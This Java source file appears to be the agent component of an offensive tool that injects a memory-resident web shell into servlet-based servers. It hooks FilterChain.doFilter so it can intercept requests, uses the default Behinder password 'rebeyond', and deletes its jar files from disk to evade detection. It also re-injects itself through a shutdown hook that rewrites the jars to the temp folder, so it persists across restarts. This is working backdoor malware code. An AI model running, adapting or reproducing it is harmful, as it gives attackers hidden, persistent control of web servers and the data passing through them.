package cn.com.x1001;

/**
 * @author x1001 
 * 2020/11/17
 *
 */
import cn.com.x1001.bean.ClassInfo;
import cn.com.x1001.bean.InstrumentationContext;
import cn.com.x1001.hook.HookTransformer;
import cn.com.x1001.utils.StringUtil;

import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Arrays;

public class Agent {
    //打印输出
    public static PrintStream out = System.out;
    public static InstrumentationContext context = new InstrumentationContext();
    public static String currentPath ;
    public static String password = "rebeyond";
    public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};


    public static void agentmain(String args, Instrumentation inst) throws IOException {
        if (args.contains("^")) {
            Agent.currentPath = args.split("\\^")[0];
            Agent.password = args.split("\\^")[1];
        } else {
            Agent.currentPath = args;
        }
        out.println("Agent password:"+Agent.password);
        out.println("Agent currentPath:"+Agent.currentPath);
        start(inst);
    }

    private static void start(Instrumentation inst) {
        out.println("********************************************************************");
        out.println("*                      shell inject success                        *");
        out.println("********************************************************************");
        addHook();
        inst.addTransformer(new HookTransformer(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();

        for (Class clazz : loadedClasses) {
            Class[] interfaces = clazz.getInterfaces();
            String name = clazz.getName().replace(".", "/");
            if (context.isExistClass(name) || context.isExistClass(interfaces)) {
                try {
                    // hook已经加载的类，或者是回滚已经加载的类
                    inst.retransformClasses(clazz);
                } catch (Throwable t) {
                    //
                }
            }

        }
        try {
            readInjectFile(Agent.currentPath);
            readAgentFile(Agent.currentPath);
            clear(Agent.currentPath);
            persist();
        } catch (Exception e) {
            System.out.println(e);
        }

    }
    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
        System.out.println("写入文件路径："+tempFolder);
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();
    }

    /**
     * 添加hook点
     */
    public static void addHook(){
        ClassInfo classInfo = new ClassInfo();
        classInfo.setClassName("javax/servlet/FilterChain");
        classInfo.addMethodDesc("doFilter", null);
        context.getClassHashSet().add(classInfo);
    }
    public static void persist() {
        try {
            out.println("persist add");
            Thread t = new Thread() {
                public void run() {
                    try {
                        out.println("persist start");
                        writeFiles("inject.jar", Agent.injectFileBytes);
                        writeFiles("shell-agent.jar", Agent.agentFileBytes);
                        out.println("persist end");
                        startInject();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {
            out.println(t.getMessage());
        }
    }

    private static void startInject() throws InterruptedException, IOException {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "inject.jar " + Agent.password;
        Runtime.getRuntime().exec(cmd);
    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            totalLength += byteArray[i].length;
        }

        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
        }

        return result;
    }

    public static void readInjectFile(String filePath) throws Exception {
        String fileName = "inject.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "shell-agent.jar";
        File f = new File(filePath + File.separator + fileName);
        System.out.println(f.getAbsolutePath());
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = Agent.currentPath;

            public void run() {
                try {
                    Thread.sleep(5000);
                    String injectFile = currentPath + "inject.jar";
                    String agentFile = currentPath + "shell-agent.jar";
                    new File(injectFile).getCanonicalFile().delete();
                    String OS = System.getProperty("os.name").toLowerCase();
                    out.println("file delete success!!!");
                    new File(agentFile).delete();
                } catch (Exception e) {
                    out.println(e);
                }
            }
        };
        clearThread.start();

    }

//    public static void unlockFile(String currentPath) throws Exception {
//        String exePath = currentPath + "forecedelete.exe";
//        InputStream is = Agent.class.getClassLoader().getResourceAsStream("forcedelete.exe");
//        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
//        byte[] bytes = new byte[1024 * 100];
//        int num = 0;
//        while ((num = is.read(bytes)) != -1) {
//            fos.write(bytes, 0, num);
//            fos.flush();
//        }
//        fos.close();
//        is.close();
//        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
//        try {
//            process.waitFor();
//        } catch (InterruptedException e) {
//            // TODO Auto-generated catch block
//            e.printStackTrace();
//        }
//        new File(exePath).delete();
//    }
//    public static String getCurrentPid() {
//        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
//        return runtimeMXBean.getName().split("@")[0];
//    }


}
